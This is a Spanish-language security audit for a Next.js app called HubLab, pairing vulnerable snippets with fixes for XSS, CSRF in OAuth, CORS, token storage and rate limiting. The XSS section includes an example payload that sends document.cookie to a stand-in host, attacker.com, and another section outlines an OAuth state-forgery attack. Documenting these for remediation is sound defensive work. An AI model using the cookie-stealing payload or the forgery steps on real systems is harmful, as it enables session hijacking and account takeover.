# 🔐 Correcciones de Seguridad Requeridas - HubLab

## ⚠️ ADVERTENCIA: NO DEPLOYAR A PRODUCCIÓN HASTA RESOLVER VULNERABILIDADES CRÍTICAS

---

## 🔴 CRÍTICO - Resolver Antes de Cualquier Deploy

### 1. XSS en Templates de Email

**Archivos:**
```
app/api/waitlist/route.ts:99-100
app/api/contact/route.ts:66-76
```

**Código Vulnerable:**
```typescript
const html = `
  <h1>New Contact Form Submission</h1>
  <p><strong>Name:</strong> ${name}</p>
  <p><strong>Email:</strong> ${email}</p>
  <p><strong>Message:</strong> ${message}</p>
`;
```

**Exploit Ejemplo:**
```typescript
name = "<img src=x onerror='fetch(\"https://attacker.com?cookie=\"+document.cookie)'>"
```

**Fix:**
```typescript
import DOMPurify from 'isomorphic-dompurify';

const sanitize = (input: string) => DOMPurify.sanitize(input, {
  ALLOWED_TAGS: [],
  ALLOWED_ATTR: []
});

const html = `
  <h1>New Contact Form Submission</h1>
  <p><strong>Name:</strong> ${sanitize(name)}</p>
  <p><strong>Email:</strong> ${sanitize(email)}</p>
  <p><strong>Message:</strong> ${sanitize(message)}</p>
`;
```

---

### 2. Token de Bypass Hardcodeado

**Archivo:** `middleware.ts:22`

**Código Vulnerable:**
```typescript
const BYPASS_TOKEN = process.env.AI_BYPASS_TOKEN || 'dev-bypass-token-123';
```

**Riesgo:** Cualquiera puede usar `'dev-bypass-token-123'` para bypasear acceso.

**Fix:**
```typescript
const BYPASS_TOKEN = process.env.AI_BYPASS_TOKEN;

if (process.env.NODE_ENV === 'production' && !BYPASS_TOKEN) {
  throw new Error('AI_BYPASS_TOKEN must be set in production environment');
}

if (!BYPASS_TOKEN) {
  console.warn('⚠️  Using development without bypass token - AI checks fully enforced');
}

// Luego en el código:
if (BYPASS_TOKEN && bypassToken === BYPASS_TOKEN) {
  // permitir acceso
}
```

---

### 3. CSRF en OAuth (Escalación de Privilegios)

**Archivos:**
```
app/api/crm/hubspot/connect/route.ts
app/api/crm/hubspot/callback/route.ts
```

**Código Vulnerable:**
```typescript
// En connect:
const state = `${userId}:${Date.now()}`;

// En callback:
const [userId] = state.split(':'); // ❌ El atacante puede falsificar esto
```

**Ataque:**
```
1. Atacante crea link: /api/crm/hubspot/connect
2. Intercepta el redirect y extrae el código OAuth
3. Modifica state a "VICTIM_USER_ID:123456"
4. Completa callback, conectando CRM del atacante a cuenta de la víctima
```

**Fix:**
```typescript
// Instalar: npm install ioredis
import Redis from 'ioredis';
const redis = new Redis(process.env.UPSTASH_REDIS_URL);

// En connect/route.ts:
import crypto from 'crypto';

const stateToken = crypto.randomBytes(32).toString('hex');
await redis.setex(`oauth:state:${stateToken}`, 600, userId); // 10 min expiry

const authUrl = `https://app.hubspot.com/oauth/authorize?client_id=${clientId}&redirect_uri=${redirectUri}&scope=${scopes}&state=${stateToken}`;

// En callback/route.ts:
const { code, state } = await request.json();

const storedUserId = await redis.get(`oauth:state:${state}`);
if (!storedUserId) {
  return NextResponse.json({ error: 'Invalid or expired state' }, { status: 400 });
}

await redis.del(`oauth:state:${state}`); // Use once

// Ahora usar storedUserId (no del state)
```

---

### 4. Datos de Usuario en Cookies sin Cifrar

**Archivo:** `app/api/auth/google/callback/route.ts:65-75`

**Código Vulnerable:**
```typescript
const userData = {
  id: profile.id,
  email: profile.email,
  name: profile.name,
  picture: profile.picture,
};

response.cookies.set('user', JSON.stringify(userData), {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'lax',
  maxAge: 60 * 60 * 24 * 7, // 7 days
});
```

**Problemas:**
1. Datos personales en texto plano
2. `secure: false` en desarrollo expone cookies
3. Sin firma/cifrado

**Fix:**
```typescript
import { SignJWT, jwtVerify } from 'jose';

const JWT_SECRET = new TextEncoder().encode(
  process.env.JWT_SECRET || crypto.randomBytes(32).toString('hex')
);

// Crear token:
const token = await new SignJWT({
  userId: profile.id,
  email: profile.email,
  name: profile.name,
})
  .setProtectedHeader({ alg: 'HS256' })
  .setIssuedAt()
  .setExpirationTime('7d')
  .sign(JWT_SECRET);

response.cookies.set('session', token, {
  httpOnly: true,
  secure: true, // Siempre secure
  sameSite: 'strict',
  maxAge: 60 * 60 * 24 * 7,
});

// Verificar token:
try {
  const { payload } = await jwtVerify(token, JWT_SECRET);
  // usar payload.userId, payload.email, etc.
} catch (error) {
  // Token inválido o expirado
}
```

---

### 5. HTML sin Escapar en Generación de Código

**Archivo:** `app/api/github-to-capsule/route.ts:240-346`

**Problema:** URLs de GitHub sin validar usadas directamente en `src` de iframe.

**Fix:**
```typescript
import { z } from 'zod';

const urlSchema = z.string().url().refine((url) => {
  const parsed = new URL(url);
  return ['github.com', 'githubusercontent.com'].includes(parsed.hostname);
}, { message: 'Only GitHub URLs allowed' });

// Validar antes de usar:
try {
  const validUrl = urlSchema.parse(repoUrl);
  // usar validUrl
} catch (error) {
  return NextResponse.json({ error: 'Invalid URL' }, { status: 400 });
}
```

---

### 6. CORS Permisivo

**Archivos:**
```
app/api/ai/capsules/route.ts:118, 145
app/api/ai/metadata/route.ts:138, 164
app/api/ai/capsules/[id]/route.ts:49, 76
```

**Código Vulnerable:**
```typescript
headers.set('Access-Control-Allow-Origin', '*');
```

**Fix:**
```typescript
const ALLOWED_ORIGINS = process.env.ALLOWED_ORIGINS?.split(',') || [
  'https://yourdomain.com',
  'https://app.yourdomain.com',
];

const origin = request.headers.get('origin');
if (origin && ALLOWED_ORIGINS.includes(origin)) {
  headers.set('Access-Control-Allow-Origin', origin);
  headers.set('Access-Control-Allow-Credentials', 'true');
} else if (process.env.NODE_ENV === 'development') {
  headers.set('Access-Control-Allow-Origin', origin || '*');
}
```

**Agregar a .env:**
```
ALLOWED_ORIGINS=https://yourdomain.com,https://app.yourdomain.com
```

---

## 🟠 HIGH - Resolver en Semana 2

### 7. Service Role Keys en API Routes

**Problema:** Uso de `createClient()` con service role key bypasa RLS.

**Archivos afectados:**
- `app/api/v1/projects/route.ts:22`
- `lib/api/auth.ts:13`
- 8+ otros API routes

**Fix:**
```typescript
// ❌ NO USAR:
import { createClient } from '@supabase/supabase-js';
const supabase = createClient(url, serviceRoleKey);

// ✅ USAR:
import { createServerClient } from '@supabase/ssr';
import { cookies } from 'next/headers';

const supabase = createServerClient(
  process.env.NEXT_PUBLIC_SUPABASE_URL!,
  process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!, // Anon key, no service role
  {
    cookies: {
      get(name: string) {
        return cookies().get(name)?.value;
      },
    },
  }
);
```

Esto usa el token de autenticación del usuario, respetando RLS.

---

### 8. Tokens OAuth Sin Cifrar

**Archivo:** `app/api/crm/hubspot/callback/route.ts:81`

**Código:**
```typescript
// TODO: Encrypt tokens before storing
await supabase.from('hubspot_connections').insert({
  user_id: userId,
  access_token: accessToken, // ❌ Texto plano
  refresh_token: refreshToken, // ❌ Texto plano
});
```

**Fix:**
```typescript
import crypto from 'crypto';

const ENCRYPTION_KEY = Buffer.from(process.env.ENCRYPTION_KEY!, 'hex'); // 32 bytes
const IV_LENGTH = 16;

function encrypt(text: string): string {
  const iv = crypto.randomBytes(IV_LENGTH);
  const cipher = crypto.createCipheriv('aes-256-cbc', ENCRYPTION_KEY, iv);
  let encrypted = cipher.update(text, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  return iv.toString('hex') + ':' + encrypted;
}

function decrypt(text: string): string {
  const [ivHex, encryptedHex] = text.split(':');
  const iv = Buffer.from(ivHex, 'hex');
  const decipher = crypto.createDecipheriv('aes-256-cbc', ENCRYPTION_KEY, iv);
  let decrypted = decipher.update(encryptedHex, 'hex', 'utf8');
  decrypted += decipher.final('utf8');
  return decrypted;
}

// Usar:
await supabase.from('hubspot_connections').insert({
  user_id: userId,
  access_token: encrypt(accessToken),
  refresh_token: encrypt(refreshToken),
});
```

**Generar clave:**
```bash
node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
```

Agregar a `.env`:
```
ENCRYPTION_KEY=tu_clave_de_64_caracteres_hex
```

---

### 9. Stack Traces en Producción

**Archivo:** `app/api/compiler/generate/route.ts:83`

**Código Vulnerable:**
```typescript
return NextResponse.json({
  error: error.message,
  stack: error.stack // ❌ Expone arquitectura
}, { status: 500 });
```

**Fix:**
```typescript
import * as Sentry from '@sentry/nextjs';

try {
  // código
} catch (error) {
  Sentry.captureException(error, {
    tags: { endpoint: '/api/compiler/generate' },
    extra: { userId, projectId }
  });

  return NextResponse.json({
    error: process.env.NODE_ENV === 'production'
      ? 'An error occurred during compilation'
      : error.message,
  }, { status: 500 });
}
```

---

### 10. Rate Limiting

**Archivos sin protección:**
- `app/api/ai/**` (múltiples)
- `app/api/contact/route.ts`
- `app/api/waitlist/route.ts`
- `app/api/marketplace/**`

**Fix:**
```typescript
// lib/rate-limit.ts (ya existe, usar en todos los endpoints)
import { ratelimit } from '@/lib/rate-limit';

export async function POST(request: Request) {
  const ip = request.headers.get('x-forwarded-for') || 'unknown';

  const { success, limit, remaining, reset } = await ratelimit.limit(ip);

  if (!success) {
    return NextResponse.json(
      { error: 'Rate limit exceeded' },
      {
        status: 429,
        headers: {
          'X-RateLimit-Limit': limit.toString(),
          'X-RateLimit-Remaining': remaining.toString(),
          'X-RateLimit-Reset': reset.toString(),
        }
      }
    );
  }

  // continuar con lógica...
}
```

---

### 11. API Keys Sin Hashear

**Archivo:** `lib/api/auth.ts:44-56`

**Fix:**
```typescript
import crypto from 'crypto';

function hashApiKey(apiKey: string): string {
  return crypto.createHash('sha256').update(apiKey).digest('hex');
}

// Al crear API key:
const apiKey = crypto.randomBytes(32).toString('hex');
const hashedKey = hashApiKey(apiKey);

await supabase.from('api_keys').insert({
  key_hash: hashedKey, // Guardar hash
  // ... otros campos
});

return { apiKey }; // Mostrar una sola vez al usuario

// Al validar:
const providedKeyHash = hashApiKey(providedApiKey);
const { data } = await supabase
  .from('api_keys')
  .select('*')
  .eq('key_hash', providedKeyHash)
  .single();
```

---

## 🔧 Variables de Entorno Requeridas

Agregar a `.env`:

```bash
# Seguridad
JWT_SECRET=tu_secreto_jwt_min_32_caracteres
ENCRYPTION_KEY=clave_hex_64_caracteres_de_crypto_randomBytes_32
AI_BYPASS_TOKEN=token_seguro_aleatorio_min_32_caracteres

# CORS
ALLOWED_ORIGINS=https://tudominio.com,https://app.tudominio.com

# Ya existentes (validar que estén configuradas)
NEXT_PUBLIC_SUPABASE_URL=
NEXT_PUBLIC_SUPABASE_ANON_KEY=
SUPABASE_SERVICE_ROLE_KEY= # Solo para scripts admin, NO en API routes
UPSTASH_REDIS_URL=
```

---

## ✅ Checklist de Seguridad Pre-Deploy

- [ ] Todas las vulnerabilidades CRÍTICAS resueltas
- [ ] Rate limiting implementado en todos los endpoints públicos
- [ ] API keys hasheadas
- [ ] Tokens OAuth cifrados
- [ ] CORS restringido a dominios permitidos
- [ ] Sin stack traces en producción
- [ ] JWT implementado para sesiones
- [ ] OAuth state validation con Redis
- [ ] Sin tokens hardcodeados
- [ ] Variables de entorno configuradas
- [ ] Service role keys eliminadas de API routes
- [ ] Sanitización de input en emails
- [ ] Tests de seguridad ejecutados
- [ ] Penetration testing completado

---

**Prioridad Máxima: Items 1-6 deben resolverse ANTES de cualquier deploy a producción.**
